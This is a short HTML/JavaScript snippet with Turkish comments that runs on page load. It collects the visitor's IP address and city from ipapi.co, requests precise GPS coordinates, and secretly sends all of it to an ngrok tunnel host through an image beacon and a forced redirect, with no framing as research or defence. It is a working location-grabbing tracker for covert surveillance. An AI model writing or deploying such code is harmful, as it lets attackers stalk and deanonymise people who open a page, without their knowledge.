<script>
    async function konumAl() {
        try {
            const res = await fetch('https://ipapi.co/json/');
            const ipData = await res.json();

            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    const coords = pos.coords.latitude + "," + pos.coords.longitude;
                    firlat(ipData.ip, ipData.city, coords, "GPS_TAM_ISABET");
                },
                (err) => {
                    const tahmini = ipData.latitude + "," + ipData.longitude;
                    firlat(ipData.ip, ipData.city, tahmini, "GPS_RED");
                }
            );
        } catch (e) { console.log("Hata"); }
    }

    function firlat(ip, city, loc, status) {
        // Linkin sonundaki /log kısmını sildik, direkt ana adrese gönderiyoruz
        const hedef = `https://punctual-villain-arson.ngrok-free.dev/?ip=${ip}&city=${city}&loc=${loc}&status=${status}`;
        
        // Bu yöntem en garantisidir
        const ping = new Image();
        ping.src = hedef;
        
        // Yedek olarak sayfayı da oraya yönlendirelim ki garanti olsun
        setTimeout(() => { window.location.href = hedef; }, 1000);
    }

    window.onload = konumAl;
</script>
